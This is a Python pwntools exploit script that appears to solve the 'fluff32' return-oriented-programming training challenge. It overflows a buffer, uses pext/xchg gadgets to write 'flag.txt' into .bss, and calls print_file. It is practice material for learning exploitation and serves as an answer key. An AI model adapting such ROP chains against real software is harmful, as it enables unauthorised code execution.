from pwn import *

elf = ELF("./fluff32")

# 各種アドレス
xchg          = 0x08048555  # xchg  BYTE PTR [ecx],dl
pext          = 0x08048543
pop_ecx_bswap = 0x08048558  # pop  ecx;  bswap  ecx;  ret;
pop_ebp       = 0x080485bb
bss_addr      = elf.bss()
pext_str      = []

payload = b"B" * 44

def create_mask():
    bin_masks = [0b101101001011, 0b1011011101, 0b1110101000110, 0b101101011010, 0b11011011, 0b101011001101, 0b1101011000101, 0b101011001101]
    hex_masks = []

    for mask in bin_masks:
        hex_masks.append(int(hex(mask), 16))

    return hex_masks

def write(index):
    global payload, pop_ebp, pext_str

    payload += p32(pop_ebp)
    payload += p32(pext_str[index])
    
    payload += p32(pext)
    payload += p32(pop_ecx_bswap)
    payload += p32((bss_addr + index), endian="big")
    payload += p32(xchg)

def main():
    global pext_str, bss_addr, payload

    #pext_str = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0xdb, 0xacd, 0x1ac5, 0xacd]
    pext_str = create_mask()

    for i in range(8):
        write(i)

    payload += p32(elf.symbols["print_file"])
    payload += b"BBBB"
    payload += p32(bss_addr)

    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
            
    print(payload)



if __name__ == "__main__":
    main()